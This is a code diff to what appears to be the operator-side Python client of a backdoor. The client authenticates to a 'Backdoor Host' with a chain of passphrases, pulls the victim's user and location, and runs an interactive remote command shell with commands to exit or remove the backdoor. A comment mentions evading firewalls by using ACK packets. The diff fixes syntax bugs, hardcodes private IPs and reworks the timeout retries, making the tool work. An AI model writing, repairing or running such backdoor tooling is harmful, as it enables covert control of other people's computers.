@@ -12,10 +12,15 @@ prompt = ""
 username = ""
 sep = ""
 
-localHost = input("Local Host IP: ")
-localPort = int("Local Port Number: ")
-remoteHost = input("Backdoor Host IP: ")
-remotePort = int(input("Backdoor Port Number: "))
+# localHost = input("Local Host IP: ")
+# localPort = int(input("Local Port Number: "))
+# remoteHost = input("Backdoor Host IP: ")
+# remotePort = int(input("Backdoor Port Number: "))
+
+localHost = "192.168.0.24"
+localPort = 80
+remoteHost = "192.168.0.23"
+remotePort = 80
 
 # Use ACK packet instead of SYN packet because the chance of
 # triggering the firewall
@@ -44,12 +49,7 @@ def Request(localHost, localPort, remoteHost, remotePort):
                 sock.close()
                 nAttempts -= 1
                 print("WARNING: Received unauthorized connection request... Connection refused")
-        except socket.timeout:
-            sock.close()
-            nAttempts -= 1
-            print("ERROR: Timeout... retrying")
 
-        try:
             if nAttempts == 0:
                 raise socket.timeout()
             conn.sendall(b"passphrase2")
@@ -60,7 +60,7 @@ def Request(localHost, localPort, remoteHost, remotePort):
                 if passphrase == "passphrase3":
                     conn.sendall(b"Report")
                     user = conn.recv(BUFSIZE)
-                    IF type(user) == bytes:
+                    if type(user) == bytes:
                         user = user.decode("utf-8")
                     conn.sendall(b"Location")
                     location = conn.recv(BUFSIZE)
@@ -76,9 +76,13 @@ def Request(localHost, localPort, remoteHost, remotePort):
                     conn.close()
                     return None, None
         except socket.timeout:
+            if nAttempts == 0:
+                sock.close()
+                print("ERROR: No answer from the backdoor")
+                return None, None
             sock.close()
-            print("ERROR: No answer from the backdoor")
-            return None, None
+            nAttempts -= 1
+            print("ERROR: Timeout... retrying")
         except (KeyboardInterrupt, SystemExit):
             sock.close()
             print("ERROR: User keyboard interruption")
@@ -93,41 +97,45 @@ def SendCommand(conn, command):
 
 def ConnectBackdoor(localHost, localPort, remoteHost, remotePort):
     global prompt, username, sep
-    sock, conn = Request(localHost, localPort, remoteHost, remotePort)
-    if sock != None and conn != None:
-        try:
-            while True:
-                command = input(prompt+" ")
-                if command != "":
-                    output = SendCommand(conn, command)
-                    if command.split()[0] == "cd":
-                        if len(output.split()) == 1
-                            prompt = username + output + sep
+    try:
+        sock, conn = Request(localHost, localPort, remoteHost, remotePort)
+        if sock != None and conn != None:
+            try:
+                while True:
+                    command = input(prompt+" ")
+                    if command != "":
+                        output = SendCommand(conn, command)
+                        if command.split()[0] == "cd":
+                            if len(output.split()) == 1:
+                                prompt = username + output + sep
+                            else:
+                                print(output)
+                        elif output.lower() == "exited":
+                            print("Success: Backdoor closed")
+                            break
+                        elif output.lower() == "released":
+                            print("Success: Backdoor removed")
+                            break
                         else:
-                            print(output)
-                    elif output.lower() == "exited":
-                        print("Success: Backdoor closed")
-                        break
-                    elif output.lower() == "released":
-                        print("Success: Backdoor removed")
-                        break
+                            if output.lower() != "daemonnoreport":
+                                print(output)
                     else:
-                        if output.lower() != "daemonnoreport"
-                            print(output)
-                else:
-                    continue
-        except (KeyboardInterrupt, SystemExit):
-            output = SendCommand(conn, "exit")
-            if output.lower() == "exited":
-                print("Success: Done")
-        except Exception as err:
-            print(err.args)
-            print("ERROR: Something went wrong")
-            output = SendCommand(conn, "exit")
-            if output.lower() == "exited":
-                print("Success: Backdoor closed")
-        finally:
-            conn.close()
-            sock.close()
+                        continue
+            except (KeyboardInterrupt, SystemExit):
+                output = SendCommand(conn, "exit")
+                if output.lower() == "exited":
+                    print("Success: Done")
+            except Exception as err:
+                print(err.args)
+                print("ERROR: Something went wrong")
+                output = SendCommand(conn, "exit")
+                if output.lower() == "exited":
+                    print("Success: Backdoor closed")
+            finally:
+                conn.close()
+                sock.close()
+    except TypeError:
+        print("ERROR: Cannot connect to the backdoor")
+        sys.exit(1)
 
-ConnectBackdoor()
+ConnectBackdoor(localHost, localPort, remoteHost, remotePort)
